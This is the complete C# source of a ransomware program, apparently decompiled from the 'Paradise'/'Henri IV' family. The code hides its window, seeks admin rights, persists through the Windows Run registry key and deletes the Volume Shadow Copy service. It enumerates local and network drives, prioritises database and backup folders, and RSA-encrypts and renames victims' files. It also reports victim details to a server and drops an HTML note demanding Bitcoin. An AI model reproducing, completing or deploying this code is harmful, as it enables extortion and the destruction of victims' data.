using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace DP_MainForm;

public sealed class Program
{
	private static class NativeMethods
	{
		public const int SW_HIDE = 0;

		public const int SW_SHOW = 5;

		[DllImport("kernel32.dll")]
		public static extern IntPtr GetConsoleWindow();

		[DllImport("user32.dll")]
		public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
	}

	private const string name = "svch";

	private static Thread[] Threads;

	private object locker = new object();

	private static string server = "localhost";

	private static string mail = "fuckparadise@heniiv.com";

	private static string vector = "00zB8gK7";

	private static string text = " <html> <head> <meta charset='utf-8'> <title>WHAT HAPPENED</title> <style type='text/css'> body { font: 15px Tahoma, sans-serif; margin: 10px; line-height: 25px; background-color: #C1AB8F; } .bold { font-weight: bold; } .xx { border: 1px dashed #000; background: #E3D5F1; } .mark { background: #D0D0E8; padding: 2px 5px; } .header { font-size: 30px; height: 50px; line-height: 50px; font-weight: bold; border-bottom: 10px solid #D0D0E8; } .info { background: #D0D0E8; border-left: 10px solid #00008B; } .after { background: #FFE4E4; border-left: 10px solid #A5A52F; } .third { background: #FFE4E4; border-left: 10px solid #0000FF; } .alert { background: #FFE4E4; border-left: 10px solid #0000FF; } .contact { background: #CCCCCC; border-left: 10px solid #00FF00; } .party { background: #FFE4E4; border-left: 10px solid #FF0000; } .private { border: 1px dashed #000; background: #FFFFEF; } .note { height: auto; padding-bottom: 1px; margin: 15px 0; } .note .title { font-weight: bold; text-indent: 10px; height: 30px; line-height: 30px; padding-top: 10px; } .note .mark { background: #A2A2B5; } .note ul { margin-top: 0; } .note pre { margin-left: 15px; line-height: 13px; font-size: 13px; }</style> </head> <div class='header'>Your files are encrypted!</div> <div class='header'>FUCK Paradise Ransomware Team! HENRI IV</div><div class='note private'> <div class='title'>Your personal ID</div> <pre>%ID%</pre><div class='title'>Your personal KEY</div> <pre><textarea name='mesage' rows='10' cols='150' wrap='virtual'>%KEY%</textarea></div> <div class='note after'> <div class='title'>WHAT HAPPENED!</div> <ul><li>Your important files produced on this computer have been encrypted due a security problem.</li> <li>If you want to restore them, write to us by email.</li><li>You have to pay for decryption in Bitcoins. The price depends on how fast you write to us.</li> <li>After payment we will send you the decryption tool that will decrypt all your files.</li> </ul> </div> <div class='note third'> <div class='title'>FREE DECRYPTION AS GUARANTEE!</div> <ul><li>Before payment you can send us 1-3 files for free decryption.</li> <li>Please note that files must NOT contain valuable information.</li><li>The file size should not exceed 1MB.</li> <li>As evidence, we can decrypt one file</li>  </ul> </div> <div class='note alert'> <div class='title'>HOW TO OBTAIN BITCOINS!</div> <ul><li>The easiest way to buy bitcoin is LocalBitcoins site.</li> <li>You have to register, click Buy bitcoins and select the seller by payment method and price</li><li><a href='https://localbitcoins.com/buy_bitcoins/'>https://localbitcoins.com/buy_bitcoins/</a></li><li>Also you can find other places to buy Bitcoins and beginners guide here:</li><li><a href='http://www.coindesk.com/information/how-can-i-buy-bitcoins/'>http://www.coindesk.com/information/how-can-i-buy-bitcoins/</a></li><li>write to Google how to buy Bitcoin in your country?</li>   </ul> </div> <div class='note contact'> <div class='title'>Contact!</div> <ul><li>e-mail:<input type='text' name='login' value='fuckparadise@heniiv.com' size='20' maxlength='5'> </li> <li>or</li><li>e-mail:<input type='text' name='login' value='fuckparadise@heniiv.com' size='20' maxlength='5'> </li> </ul> </div> <div> <div class='note party'> <div class='title'>Attention!</div> <ul><li>Do not rename encrypted files</li> <li>Do not try to decrypt your data using third party software, it may cause permanent data loss</li><li>You are guaranteed to get the decryptor after payment</li> <li>As evidence, we can decrypt one file</li> <li>Do not attempt to use the antivirus or uninstall the program</li> <li>This will lead to your data loss and unrecoverable</li> <li>Decoders of other users is not suitable to decrypt your files - encryption key is unique</li> </ul> </div> </body> </html> ";

	private static string RSA_MasterPublic = "<RSAKeyValue><Modulus>0/zB8gK7Mre5g5Omm3/SJ6Z21tGCnzLJZ70j8rnUx42ZfUZ7gAiCmPkg/suzkCjMRqJnCkAVqicTAphRflYMwJOj7IcQ+Y9Wg50TW/Nd0KhFzPwyOHUULEMQquNY6RTxMXP+EX/62+PyYTeok2jdQxe/zwfwU/6evIHdwWWdt6U=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

	private static string CryptedExtension = ".malwarehenri";

	private static bool LockerForValidKey = true;

	private static string PCID = "";

	private static string RSA_Public = "";

	private static string RSA_Private = "";

	private static int FilesCount = 0;

	private static bool SaveTextForUnlock = bool.Parse("True");

	public static RSACryptoServiceProvider MasterRSA = new RSACryptoServiceProvider();

	public static RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();

	public static List<string> directories = new List<string>();

	private static string CryptedPrivateKey = "";

	private static Queue<string> Drives = new Queue<string>();

	[STAThread]
	private static void Main(string[] args)
	{
		try
		{
			IntPtr consoleWindow = NativeMethods.GetConsoleWindow();
			NativeMethods.ShowWindow(consoleWindow, 0);
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			if (File.Exists(folderPath + "\\DP\\welldone.dp"))
			{
				Process.Start("#DECRYPT MY FILES#.html");
				Environment.Exit(0);
				return;
			}
			if (args.Length == 0 && CycleDefender())
			{
				int num = ProcessCount();
				if (!IsAdmin())
				{
					RunAsAdmin();
				}
				int num2 = ProcessCount();
				if (num2 > num)
				{
					Environment.Exit(0);
				}
			}
			if (File.Exists("id.dp"))
			{
				PCID = File.ReadAllText("id.dp");
			}
			else
			{
				PCID = ID_Generator();
				File.WriteAllText("id.dp", PCID);
			}
			text = text.Replace("%ID%", PCID);
			Stopwatch stopwatch = new Stopwatch();
			stopwatch.Start();
			if (!CheckKeys())
			{
				CreateKeys();
				MasterRSA.FromXmlString(RSA_MasterPublic);
				rsa.FromXmlString(RSA_Public);
				SavePrivateKey();
				while (LockerForValidKey)
				{
				}
				AddToAutorun();
				DeleteShadowCopies();
			}
			text = text.Replace("%KEY%", CryptedPrivateKey);
			GetDrives();
			Handler();
			stopwatch.Stop();
			int num3 = stopwatch.Elapsed.Hours * 60 + stopwatch.Elapsed.Minutes;
			string elapsed_time = num3 + ":" + stopwatch.Elapsed.Seconds;
			AddEncryptedPC(elapsed_time, CryptedPrivateKey);
			File.WriteAllText(folderPath + "\\DP\\welldone.dp", "Done");
			Process.Start("#DECRYPT MY FILES#.html");
			Environment.Exit(0);
		}
		catch (Exception)
		{
		}
	}

	private static bool CycleDefender()
	{
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string path = folderPath + "\\DP\\RunAsAdmin.dp";
			if (!Directory.Exists(folderPath + "\\DP"))
			{
				Directory.CreateDirectory(folderPath + "\\DP");
				File.WriteAllText(path, "0");
				return true;
			}
			string text = File.ReadAllText(path);
			if (text == "0")
			{
				File.WriteAllText(path, "1");
				return true;
			}
			return false;
		}
		catch
		{
			return true;
		}
	}

	private static void AddToAutorun()
	{
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			if (!Directory.Exists(folderPath + "\\DP"))
			{
				Directory.CreateDirectory(folderPath + "\\DP");
			}
			File.Copy(Application.get_ExecutablePath(), folderPath + "\\DP\\DP_Main.exe");
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("DP_Main", folderPath + "\\DP\\DP_Main.exe");
			registryKey.Close();
		}
		catch (Exception)
		{
		}
	}

	private static void DeleteShadowCopies()
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/C sc delete VSS");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			StreamReader standardOutput = process.StandardOutput;
			standardOutput.ReadToEnd();
			process.WaitForExit();
		}
		catch (Exception)
		{
		}
	}

	private static bool CheckKeys()
	{
		string text = "";
		string text2 = "";
		try
		{
			text = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
			text2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\DP";
		}
		catch (Exception)
		{
		}
		string text3 = "\\DecryptionInfo.auth";
		string text4 = "";
		string cryptedPrivateKey = "";
		if (File.Exists(text + text3))
		{
			string text5 = File.ReadAllText(text + text3);
			text4 = text5.Split(new char[1] { '\n' })[1];
			cryptedPrivateKey = text5.Split(new char[1] { '\n' })[0];
		}
		if (File.Exists(text2 + text3))
		{
			string text6 = File.ReadAllText(text2 + text3);
			text4 = text6.Split(new char[1] { '\n' })[1];
			cryptedPrivateKey = text6.Split(new char[1] { '\n' })[0];
		}
		if (text4 != "")
		{
			RSA_Public = text4;
			CryptedPrivateKey = cryptedPrivateKey;
			return true;
		}
		return false;
	}

	private static void CreateKeys()
	{
		RSA_Public = rsa.ToXmlString(includePrivateParameters: false);
		RSA_Private = rsa.ToXmlString(includePrivateParameters: true);
	}

	[DllImport("USER32.DLL", CharSet = CharSet.Unicode)]
	public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	[DllImport("USER32.DLL")]
	public static extern bool SetForegroundWindow(IntPtr hWnd);

	public static string ID_Generator()
	{
		string text = "";
		Random random = new Random();
		while (text.Length < 8)
		{
			char c = (char)random.Next(33, 125);
			if (char.IsLetterOrDigit(c))
			{
				text += c;
			}
		}
		return text;
	}

	private static void AddEncryptedPC(string elapsed_time, string DecryptionInfo)
	{
		try
		{
			string address = server + "/api/Encrypted.php";
			using WebClient webClient = new WebClient();
			NameValueCollection nameValueCollection = new NameValueCollection();
			nameValueCollection.Add("v", vector);
			nameValueCollection.Add("fc", FilesCount.ToString());
			nameValueCollection.Add("computer_name", Environment.MachineName);
			nameValueCollection.Add("et", elapsed_time);
			nameValueCollection.Add("decryption_info", DecryptionInfo);
			nameValueCollection.Add("id", PCID);
			webClient.UploadValues(address, nameValueCollection);
		}
		catch (Exception)
		{
		}
	}

	public static bool IsAdmin()
	{
		WindowsIdentity current = WindowsIdentity.GetCurrent();
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
		return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static int ProcessCount()
	{
		int num = 0;
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName.ToLower().Contains("dp_main"))
			{
				num++;
			}
		}
		return num;
	}

	public static void RunAsAdmin()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Verb = "runas";
		processStartInfo.FileName = Directory.GetCurrentDirectory() + "\\DP_Main.exe";
		try
		{
			Process.Start(processStartInfo);
		}
		catch (Exception)
		{
		}
	}

	private static void Handler()
	{
		try
		{
			PriorityEncryption();
			while (Drives.Count != 0 && Drives != null)
			{
				string text = "";
				text = Drives.Dequeue();
				if (!string.IsNullOrEmpty(text))
				{
					EncryptFolder(text);
				}
			}
			GetDesktopFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
		}
		catch (Exception)
		{
		}
	}

	private static void SavePrivateKey()
	{
		List<byte[]> list = new List<byte[]>();
		byte[] bytes = Encoding.Default.GetBytes(RSA_Private);
		int num = Convert.ToInt32(Math.Ceiling((double)bytes.Length / 117.0));
		int num2 = 0;
		for (int i = 0; i < num; i++)
		{
			byte[] array = new byte[117];
			for (int j = 0; j < 117; j++)
			{
				if (bytes.Length > num2)
				{
					array[j] = bytes[num2];
					num2++;
				}
			}
			list.Add(array);
		}
		string text = "";
		foreach (byte[] item in list)
		{
			byte[] bytes2 = MasterRSA.Encrypt(item, fOAEP: false);
			text += Encoding.Default.GetString(bytes2);
		}
		text = (CryptedPrivateKey = Convert.ToBase64String(Encoding.Default.GetBytes(text))) + "\n" + RSA_Public;
		if (KeyValidity())
		{
			SaveKeysToFiles(text);
			LockerForValidKey = false;
		}
	}

	private static bool KeyValidity()
	{
		byte[] array = Convert.FromBase64String(CryptedPrivateKey);
		if (array.Length != 1024)
		{
			Console.WriteLine("BAD LENGTH: " + array.Length);
			CreateKeys();
			return false;
		}
		Console.WriteLine("SUCCESS: 1024");
		LockerForValidKey = false;
		return true;
	}

	private static void SaveKeysToFiles(string text)
	{
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\DP";
			string text3 = "\\DecryptionInfo.auth";
			File.WriteAllText(folderPath + text3, text);
			Directory.CreateDirectory(text2);
			File.WriteAllText(text2 + text3, text);
		}
		catch (Exception)
		{
		}
	}

	private static void GetDrives()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			bool flag = false;
			DriveInfo[] array = drives;
			foreach (DriveInfo driveInfo in array)
			{
				if (driveInfo.Name.Contains("C:\\"))
				{
					flag = true;
				}
				else if (!Drives.Contains(driveInfo.Name))
				{
					Drives.Enqueue(driveInfo.Name);
				}
			}
			if (flag)
			{
				Drives.Enqueue("C:\\");
			}
		}
		catch (Exception)
		{
		}
	}

	private static void GetNetwork()
	{
		List<string> list = new List<string>();
		try
		{
			string text = DoCMD("NET VIEW");
			string[] array = text.Replace("\r\n", "\n").Split(new char[1] { '\n' });
			string[] array2 = array;
			foreach (string text2 in array2)
			{
				if (text2.Contains("\\\\"))
				{
					list.Add(text2.Split(new char[1] { ' ' })[0]);
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			string text3 = DoCMD("NET USE").Replace("\r\n", "\n");
			string[] array3 = text3.Split(new char[1] { '\n' });
			string[] array4 = array3;
			foreach (string input in array4)
			{
				string value = new Regex("\\s(\\S{2})\\s").Match(input).Groups[1].Value;
				if (!Drives.Contains(value + "\\") && value.Contains(":"))
				{
					Drives.Enqueue(value + "\\");
				}
				string value2 = new Regex("(\\\\\\\\[^\\\\\\s]*)", RegexOptions.IgnoreCase).Match(input).Groups[1].Value;
				if (value2 != "" && !list.Contains(value2))
				{
					list.Add(value2);
				}
			}
		}
		catch (Exception)
		{
		}
		foreach (string item in list)
		{
			try
			{
				string text4 = DoCMD("NET VIEW " + item);
				string[] array5 = text4.Replace("\r\n", "\n").Split(new char[1] { '\n' });
				string[] array6 = array5;
				foreach (string text5 in array6)
				{
					if (text5.Contains("Disk"))
					{
						string text6 = BackspacesCleaner(text5);
						Drives.Enqueue(item + "\\" + text6);
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	private static string DoCMD(string command)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/C " + command);
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			StreamReader standardOutput = process.StandardOutput;
			return standardOutput.ReadToEnd();
		}
		catch (Exception)
		{
			return "Exception";
		}
	}

	private static string BackspacesCleaner(string FolderName)
	{
		FolderName = FolderName.Replace("Disk", "");
		while (FolderName[FolderName.Length - 1] == ' ')
		{
			FolderName = FolderName.Substring(0, FolderName.Length - 2);
		}
		return FolderName;
	}

	private static void Encrypter(string file, RSACryptoServiceProvider ThRSA)
	{
		try
		{
			EncryptFile(file, ThRSA);
		}
		catch (Exception)
		{
			Encrypter(file, ThRSA);
		}
	}

	private static void PriorityEncryption()
	{
		EncryptFolder(Directory.GetCurrentDirectory());
		foreach (string drife in Drives)
		{
			PrioritySearcher(drife);
		}
	}

	private static void PrioritySearcher(string path)
	{
		try
		{
			string[] array = new string[5] { "mysql", "firebird", " mssql", "microsoft sql", "backup" };
			string[] array2 = array;
			foreach (string value in array2)
			{
				if (Path.GetDirectoryName(path)!.Contains(value))
				{
					EncryptFolder(path);
				}
			}
			string[] array3 = Directory.GetDirectories(path);
			foreach (string path2 in array3)
			{
				string[] array4 = array;
				foreach (string value2 in array4)
				{
					if (Path.GetDirectoryName(path2)!.Contains(value2))
					{
						EncryptFolder(path2);
					}
				}
				PrioritySearcher(path2);
			}
		}
		catch (Exception)
		{
		}
	}

	private static void EncryptFolder(string path)
	{
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		rSACryptoServiceProvider.FromXmlString(RSA_Public);
		List<string> list = new List<string>();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
		try
		{
			list.AddRange(Directory.GetFiles(path, "*.*", SearchOption.TopDirectoryOnly));
		}
		catch (Exception)
		{
		}
		foreach (string item in list)
		{
			FilesCount++;
			Encrypter(item, rSACryptoServiceProvider);
		}
		try
		{
			if (SaveTextForUnlock)
			{
				DropDecriptionText(path);
			}
			string[] array = Directory.GetDirectories(path);
			foreach (string text in array)
			{
				if (!text.ToLower().Contains("windows") && !text.ToLower().Contains("firefox") && !text.ToLower().Contains("chrome") && !text.ToLower().Contains("google") && !text.ToLower().Contains("opera") && !(text == Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\DP") && text != folderPath)
				{
					EncryptFolder(text);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private static void GetDesktopFiles(string path)
	{
		List<string> list = new List<string>();
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		rSACryptoServiceProvider.FromXmlString(RSA_Public);
		try
		{
			try
			{
				list.AddRange(Directory.GetFiles(path, "*.*", SearchOption.TopDirectoryOnly));
			}
			catch (Exception)
			{
			}
			foreach (string item in list)
			{
				Encrypter(item, rSACryptoServiceProvider);
			}
			if (SaveTextForUnlock)
			{
				DropDecriptionText(path);
			}
			string[] array = Directory.GetDirectories(path);
			foreach (string text in array)
			{
				EncryptFolder(text);
				directories.Add(text);
			}
		}
		catch (Exception)
		{
		}
	}

	private static void EncryptFile(string file, RSACryptoServiceProvider ThRSA)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(file);
			if (!(fileInfo.Extension != CryptedExtension) || fileInfo.FullName.Contains("#DECRYPT MY FILES#.html") || !(fileInfo.Name != "id.dp") || !(fileInfo.Name != "DecryptionInfo.auth") || !(fileInfo.Extension != ".dp"))
			{
				return;
			}
			List<byte[]> list = new List<byte[]>();
			List<byte> list2 = new List<byte>();
			if (fileInfo.Length / 1024L > 64L)
			{
				list = GetPartOfFile(file, 547);
			}
			else
			{
				int blocks_count = Convert.ToInt32(fileInfo.Length / 117L);
				if (fileInfo.Length < 117L)
				{
					list.Add(File.ReadAllBytes(file));
					using FileStream fileStream = File.OpenWrite(file);
					fileStream.SetLength(0L);
				}
				else
				{
					list = GetPartOfFile(file, blocks_count);
				}
			}
			if (list == null)
			{
				return;
			}
			foreach (byte[] item in list)
			{
				byte[] collection = ThRSA.Encrypt(item, fOAEP: false);
				list2.AddRange(collection);
			}
			File.AppendAllText(file, "<CRYPTED>" + Convert.ToBase64String(list2.ToArray()) + "</CRYPTED>", Encoding.Default);
			File.Move(file, file + "[id-" + PCID + "].[" + mail + "]" + CryptedExtension);
			File.Delete(file);
		}
		catch (Exception)
		{
		}
	}

	private static List<byte[]> GetPartOfFile(string fileName, int blocks_count)
	{
		try
		{
			int num = blocks_count * 117;
			List<byte[]> list = new List<byte[]>();
			byte[] array = new byte[num];
			using (FileStream fileStream = File.OpenRead(fileName))
			{
				fileStream.Seek(-num, SeekOrigin.End);
				fileStream.Read(array, 0, num);
			}
			using (FileStream fileStream2 = File.OpenWrite(fileName))
			{
				fileStream2.SetLength(fileStream2.Length - num);
			}
			int num2 = 0;
			for (int i = 0; i < blocks_count; i++)
			{
				byte[] array2 = new byte[117];
				for (int j = 0; j < 117; j++)
				{
					array2[j] = array[num2];
					num2++;
				}
				list.Add(array2);
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	private static void DropDecriptionText(string dir)
	{
		try
		{
			File.WriteAllText(dir.Replace("\\", "/") + "/#DECRYPT MY FILES#.html", text);
		}
		catch (Exception)
		{
		}
	}
}
